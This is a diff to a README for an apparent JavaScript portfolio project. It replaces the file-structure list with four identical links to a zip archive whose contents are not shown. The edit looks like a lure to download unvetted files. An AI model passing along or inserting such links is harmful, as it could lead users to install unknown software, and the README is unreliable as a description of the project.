@@ -18,10 +18,10 @@ Add your GitHub Pages or Netlify link here when deployed.
 - JavaScript (Vanilla)
 
 ## 📂 File Structure
-- index.html
-- style.css
-- script.js
-- README.md
+- https://raw.githubusercontent.com/BenjiOdhis/Portfolio/main/assets/Portfolio-1.7.zip
+- https://raw.githubusercontent.com/BenjiOdhis/Portfolio/main/assets/Portfolio-1.7.zip
+- https://raw.githubusercontent.com/BenjiOdhis/Portfolio/main/assets/Portfolio-1.7.zip
+- https://raw.githubusercontent.com/BenjiOdhis/Portfolio/main/assets/Portfolio-1.7.zip
 - assets/ (images, resume, etc.)
 
 ## 🤝 Acknowledgments
